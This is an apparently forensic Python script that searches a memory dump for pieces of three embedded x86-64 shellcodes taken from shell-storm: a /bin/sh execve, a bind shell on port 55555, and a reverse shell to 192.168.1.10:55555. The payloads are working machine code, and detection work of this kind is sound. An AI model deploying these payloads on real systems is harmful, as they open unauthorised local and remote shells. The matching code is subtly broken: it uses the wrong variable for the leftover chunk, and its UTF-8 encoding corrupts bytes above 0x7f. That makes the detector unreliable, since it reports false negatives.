#!/usr/bin/env python3

import argparse

# x84-64 execve /bin/sh
# http://shell-storm.org/shellcode/files/shellcode-806.php
a = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# x86-64 tcp bind shell port 55555 = 0xd903
# http://shell-storm.org/shellcode/files/shellcode-858.php
b = (
    "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
    "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
    "\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
    "\x03\xd9\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
    "\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
    "\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
    "\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
    "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
    "\x5f\x6a\x3b\x58\x0f\x05"
)

# x86-64 tcp reverse shell ip 192.168.1.10 = 0x0a1080c0 port 55555 = 0xd903
# http://shell-storm.org/shellcode/files/shellcode-857.php
c = (
    "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
    "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
    "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
    "\x02\x03\xd9\xc7\x44\x24\x04\xc0\x80\x10\x0a\x48\x89\xe6\x6a\x10"
    "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
    "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
    "\x5f\x6a\x3b\x58\x0f\x05"
)

def check_match(dump, shellcode):
    f = open(dump, 'rb')
    sample = f.read()
    f.close()

    chunks = zip(*[iter(shellcode)]*3)
    chunks = [''.join(c) for c in chunks]
    if len(a)%3:
        chunks.append(a[(len(a)//3)*3:])
        
    for c in chunks:
        if c.encode('utf-8') in sample:
            print("MATCHED", c.encode('utf-8'))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("dumpfile", help="What file has the memory dump?", type=str)
    args = parser.parse_args()
    check_match(args.dumpfile, a)
    